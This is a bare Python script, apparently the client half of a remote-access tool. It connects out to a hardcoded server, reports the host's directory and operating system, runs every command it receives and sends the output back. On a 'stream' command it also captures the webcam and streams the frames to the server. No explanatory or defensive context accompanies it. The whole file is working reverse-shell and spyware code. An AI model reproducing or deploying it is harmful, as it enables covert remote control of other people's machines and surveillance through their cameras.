import socket
import os
import subprocess
import cv2
import threading
import platform

SERVER_HOST = "192.168.0.8"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
targets_os = platform.system()
s.send(cwd.encode())
s.send(targets_os.encode())

cap = None

def video():
    global cap
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(4, byteorder='little'))
        s.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    elif command.lower() == "connect":
        output = "Client connected."
        print(output)
        s.send(output.encode())
    elif command.lower() == "stream":
        streaming_thread = threading.Thread(target=video)
        streaming_thread.start()
        output = "Live video streaming started."
        print(output)
        s.send(output.encode())
    else:
        output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
s.close()